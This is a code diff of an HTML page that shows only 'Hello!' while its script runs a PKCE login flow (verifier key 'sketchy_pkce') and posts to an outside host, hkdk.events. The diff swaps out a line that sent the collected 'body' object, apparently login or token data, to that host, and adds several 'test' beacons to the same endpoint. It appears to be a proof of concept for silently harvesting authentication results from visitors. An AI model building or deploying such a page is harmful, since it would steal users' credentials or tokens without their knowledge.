@@ -4,6 +4,10 @@
 	<h1>Hello!</h1>
     <script>
 		(async() => {
+			await fetch('https://hkdk.events/lxjnpl4yoq2m7x', {
+				method: 'POST',
+				body: 'test0',
+			});
 			const b64url = (b) => btoa(String.fromCharCode.apply(null, new Uint8Array(b))).split('+').join('-').split('/').join('_').split('=').join('');
 			const verifier =  sessionStorage.getItem('sketchy_pkce');
 			const digest = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(verifier));
@@ -19,6 +23,11 @@
 			}).toString();
 
 			let body = {};
+
+			await fetch('https://hkdk.events/lxjnpl4yoq2m7x', {
+				method: 'POST',
+				body: 'test1',
+			});
 
 			const loginRes = await fetch(url.toString(), {
 				method: 'GET'
@@ -44,8 +53,7 @@
 
 			await fetch('https://hkdk.events/lxjnpl4yoq2m7x', {
 				method: 'POST',
-				headers: { 'Content-Type': 'application/json' },
-				body: JSON.stringify(body),
+				body: 'test2',
 			});
 		})();
     </script>
